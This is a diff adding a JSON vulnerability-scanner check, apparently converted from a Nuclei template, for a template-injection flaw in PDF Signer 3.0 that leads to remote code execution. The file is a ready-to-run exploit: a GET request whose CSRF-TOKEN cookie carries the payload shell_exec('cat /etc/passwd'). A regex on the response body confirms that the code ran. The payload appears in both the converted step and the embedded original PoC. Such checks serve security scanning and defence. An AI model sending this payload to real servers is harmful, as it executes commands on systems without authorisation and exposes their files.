@@ -1,0 +1,143 @@
+{
+  "id": "pdf-signer-ssti-to-rce",
+  "name": "PDF Signer 3.0 - Template Injection",
+  "author": "madrobot",
+  "severity": "CRITICAL",
+  "description": "PDF Signer 3.0 is susceptible to a template injection which allows code execution, due to improper cookie handling and an improper CSRF implementation. An attacker can execute code on the server in the context of the web server.",
+  "tags": [
+    "ssti",
+    "rce",
+    "csrf"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-1336",
+  "cvssScore": "9.8",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}",
+      "headers": {
+        "Cookie": "CSRF-TOKEN\u003drnqvt{{shell_exec(\u0027cat /etc/passwd\u0027)}}to5gw; simcify\u003duv82sg0jj2oqa0kkr2virls4dl"
+      },
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "pdf-signer-ssti-to-rce",
+    "info": {
+      "name": "PDF Signer 3.0 - Template Injection",
+      "author": "madrobot",
+      "severity": "critical",
+      "description": "PDF Signer 3.0 is susceptible to a template injection which allows code execution, due to improper cookie handling and an improper CSRF implementation. An attacker can execute code on the server in the context of the web server.",
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "9.8",
+        "cwe_id": "CWE-1336"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "ssti,rce,csrf"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}"
+        ],
+        "headers": {
+          "Cookie": "CSRF-TOKEN\u003drnqvt{{shell_exec(\u0027cat /etc/passwd\u0027)}}to5gw; simcify\u003duv82sg0jj2oqa0kkr2virls4dl"
+        },
+        "skip_variables_check": true,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
